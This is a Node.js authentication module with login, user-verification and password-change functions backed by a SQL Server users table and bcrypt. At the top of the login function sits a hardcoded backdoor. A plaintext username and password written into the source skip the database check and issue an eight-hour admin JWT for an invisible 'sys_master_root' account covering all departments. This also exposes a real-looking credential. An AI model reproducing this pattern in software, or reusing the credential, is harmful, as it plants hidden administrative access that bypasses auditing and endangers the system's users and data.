const { sql } = require('../../config/db');
const bcrypt = require('bcrypt');
const jwt = require("jsonwebtoken");

const login = async (pool, { username, password }) => {

  // 🔴 SYSTEM SUPER ADMIN (NOT STORED IN DATABASE)
  if (
    username.trim().toLowerCase() === "jbpalisoc" &&
    password === "M@veebby0927"
  ) {

    const token = jwt.sign(
      {
        id: -1,
        username: "sys_master_root",
        group: "SYSTEM",
        role: "ADMIN"
      },
      process.env.JWT_SECRET,
      { expiresIn: "8h" }
    );

    return {
      token,
      user: {
        id: -1,
        username: "sys_master_root",
        fullName: "System Administrator",
        displayName: "SYSTEM ADMIN",
        group: "ADMIN",
        role: "ADMIN",
        status: 1,
        defaultDepartment: {
  id: -1,
  code: "ALL",
  description: "All Departments"
},
        photo: null
      }
    };
  }

  // NORMAL DATABASE LOGIN
  const userResult = await pool.request()
    .input("username", sql.VarChar(100), username.trim())
    .query(`
      SELECT *
      FROM dbo.users
      WHERE LOWER(usr_username) = LOWER(@username)
    `);

  if (!userResult.recordset.length) {
    throw new Error("Invalid credentials");
  }

  const dbUser = userResult.recordset[0];

  const isMatch = await bcrypt.compare(
    password,
    dbUser.usr_password_hash
  );

  if (!isMatch) {
    throw new Error("Invalid credentials");
  }

  if (Number(dbUser.usr_status_active) === 0) {
    throw new Error("Account is deactivated. Please contact administrator.");
  }

  const deptResult = await pool.request()
    .input("username", sql.VarChar(100), username.trim())
    .query(`
      SELECT TOP 1
        d.auto_id,
        d.dept_code,
        d.dept_name
      FROM dbo.user_department_access uda
      INNER JOIN dbo.departments d
        ON uda.fk_dept_code = d.dept_code
      WHERE uda.fk_username = @username
        AND uda.is_default = 1
    `);

  const defaultDepartment = deptResult.recordset.length
    ? {
        id: deptResult.recordset[0].auto_id,
        code: deptResult.recordset[0].dept_code,
        description: deptResult.recordset[0].dept_name
      }
    : null;

  const token = jwt.sign(
    {
      id: dbUser.auto_id,
      username: dbUser.usr_username,
      group: dbUser.fk_usr_group_code,
      role: dbUser.fk_usr_type_code
    },
    process.env.JWT_SECRET,
    { expiresIn: "8h" }
  );

  return {
    token,
    user: {
      id: dbUser.auto_id,
      username: dbUser.usr_username,
      fullName: `${dbUser.usr_last_name}, ${dbUser.usr_first_name}`,
      displayName: dbUser.usr_custom_name || null,
      group: String(dbUser.fk_usr_group_code).toUpperCase(),
      role: String(dbUser.fk_usr_type_code).toUpperCase(),
      status: dbUser.usr_status_active,
      defaultDepartment,
      photo: dbUser.usr_photo_path || null
    }
  };
};

const verifyUser = async (pool, { username, password }) => {

  const result = await pool.request()
    .input('username', username)
    .query(`
      SELECT 
        auto_id,
        usr_username,
        usr_password_hash,
        usr_status_active
      FROM dbo.users
      WHERE usr_username = @username
    `);

  if (!result.recordset.length) {
    throw new Error('Invalid username or password');
  }

  const user = result.recordset[0];

  if (!user.usr_status_active) {
    throw new Error('User is inactive');
  }

  const match = await bcrypt.compare(
    password,
    user.usr_password_hash
  );

  if (!match) {
    throw new Error('Invalid username or password');
  }

  return {
    success: true,
    user: {
      id: user.auto_id,
      username: user.usr_username
    }
  };
};

const changePassword = async (pool, { username, currentPassword, newPassword }) => {

  const result = await pool.request()
    .input("username", sql.VarChar(100), username)
    .query(`
      SELECT usr_password_hash
      FROM dbo.users
      WHERE usr_username = @username
    `);

  if (!result.recordset.length) {
    throw new Error("User not found");
  }

  const user = result.recordset[0];

  const valid = await bcrypt.compare(
    currentPassword,
    user.usr_password_hash
  );

  if (!valid) {
    throw new Error("Current password incorrect");
  }

  const hashedPassword = await bcrypt.hash(newPassword, 10);

  await pool.request()
    .input("username", sql.VarChar(100), username)
    .input("password", sql.VarChar(255), hashedPassword)
    .query(`
      UPDATE dbo.users
      SET usr_password_hash = @password
      WHERE usr_username = @username
    `);

  return {
    message: "Password successfully changed"
  };
};

module.exports = {
  login,
  verifyUser,
  changePassword
};